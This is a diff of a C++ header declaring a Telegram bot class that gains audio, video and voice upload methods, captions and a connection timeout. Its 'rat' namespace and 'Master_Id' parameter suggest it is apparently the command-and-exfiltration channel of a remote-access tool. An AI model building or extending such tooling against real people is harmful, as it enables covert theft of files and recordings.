@@ -34,10 +34,14 @@ private:
     int64_t last_update_id;
     uint16_t update_interval;
 
-
     std::string sending_message_url_base;
     std::string sending_document_url;
     std::string sending_photo_url;
+    
+    std::string sending_audio_url;
+    std::string sending_video_url;
+    std::string sending_voice_url;
+
     std::string getting_file_url;
     std::string getting_update_url;
 
@@ -45,8 +49,8 @@ public:
     /*This is because the bot gets copied inside certain threads, use its client to limit creating another handler*/
 
     rat::networking::Client curl_client;
-    Bot(const std::string& arg_Token, int64_t Master_Id);
     
+    Bot(const std::string& arg_Token, int64_t Master_Id, uint8_t Telegram_Connection_Timemout = 20);
     Bot(const Bot& other);// constructs new Client with its own CURL handle
     
     std::string getToken() const;
@@ -56,12 +60,16 @@ public:
     void setOffset(); // only for bots handling updates, not for sender-only bots
 
     BotResponse sendMessage(const std::string& Text_Message) ;
-    BotResponse sendFile(const std::filesystem::path& File_Path) ;
-    BotResponse sendPhoto(const std::filesystem::path& Photo_Path) ;
-    BotResponse sendAudio(const std::filesystem::path& Audio_Path);
-    BotResponse sendVideo(const std::filesystem::path& Video_Path);
-
+    
+    BotResponse sendFile(const std::filesystem::path& File_Path, const std::string& arg_Caption = "");
+    
+    BotResponse sendPhoto(const std::filesystem::path& Photo_Path, const std::string& arg_Caption = "");
+    BotResponse sendAudio(const std::filesystem::path& Audio_Path, const std::string& arg_Caption = "");
+    BotResponse sendVideo(const std::filesystem::path& Video_Path, const std::string& arg_Caption = "");
+    BotResponse sendVoice(const std::filesystem::path& Voice_Path, const std::string& arg_Caption = "");
+    
     bool downloadFile(const std::string& File_Id, const std::filesystem::path& Out_Path);
+    
     Update getUpdate();
 };
 
